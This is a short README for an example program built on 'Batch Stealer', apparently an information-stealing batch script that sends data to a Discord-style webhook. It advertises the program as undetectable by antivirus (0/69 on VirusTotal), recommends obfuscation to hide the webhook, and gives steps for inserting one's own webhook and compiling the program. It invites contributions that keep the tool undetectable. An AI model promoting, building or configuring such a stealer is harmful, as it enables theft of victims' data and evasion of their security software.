# BatchStealer Example Program
An example use case for the [Batch Stealer](https://github.com/Takaovi/BatchStealer). 

# [VirusTotal](https://www.virustotal.com/gui/file/8eb7e30b5347bd5541b2387f0bfaeecac1fe96b43778d9926cb426846318f85a/detection) 0/69 - 2.4.2021

* You can add more functionality to the program, but it gets at least couple antiviruses to get false positives. 

* It doesn't also matter how much of [Batch Stealer's](https://github.com/Takaovi/BatchStealer) code you use, as it's fully FUD itself as of now 2.4.2021. 
  * I just used a portion of it as a demostration and didn't obfuscate it. Obfuscation of the batch may or may not get you one or two more detections, but there's a great chance you get none from it. Obfuscation is very important as kids may want to spam your webhook if they find it.

### If you want to try it out yourself
  1. Download the source.
  2. Edit the resource file "file.bat", change the blank webhook to your own. 
  3. Compile the program, press the button and see if you get a message.

### Support
* There isn't really anything to do on this repo, but if you managed to improve the program while staying FUD, do a pull request!
